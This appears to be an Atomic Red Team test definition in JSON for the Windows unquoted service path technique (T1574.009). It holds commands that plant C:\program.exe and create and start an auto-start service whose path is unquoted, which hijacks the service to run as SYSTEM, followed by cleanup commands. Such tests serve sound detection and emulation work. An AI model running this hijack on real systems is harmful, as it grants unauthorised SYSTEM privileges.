{
  "id": "2770dea7-c50f-457b-84c4-c40a47460d9f",
  "name": "Execution of program.exe as service with unquoted service path",
  "description": "When a service is created whose executable path contains spaces and isnâ€™t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "84a7ebdc-e97f-46b8-b538-f596bdb90d6c",
      "type": "execute-command",
      "data": {
        "command": "copy \"#{service_executable}\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"#{service_executable}\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "d534fb92-7837-430a-8759-995fa3cfb849",
      "type": "execute-command",
      "data": {
        "command": "sc stop \"Example Service\" \u003enul 2\u003e\u00261\nsc delete \"Example Service\" \u003enul 2\u003e\u00261\ndel \"C:\\Program Files\\windows_service.exe\" \u003enul 2\u003e\u00261\ndel \"C:\\program.exe\" \u003enul 2\u003e\u00261\ndel \"C:\\Time.log\" \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "84a7ebdc-e97f-46b8-b538-f596bdb90d6c",
      "p": "on-success",
      "o": "d534fb92-7837-430a-8759-995fa3cfb849"
    },
    {
      "s": "84a7ebdc-e97f-46b8-b538-f596bdb90d6c",
      "p": "on-failure",
      "o": "d534fb92-7837-430a-8759-995fa3cfb849"
    }
  ],
  "tags": [
    "T1574.009",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "service_executable",
      "type": "path",
      "description": "Path of the executable used for the service and as the hijacked program.exe",
      "value": "PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe"
    }
  ]
}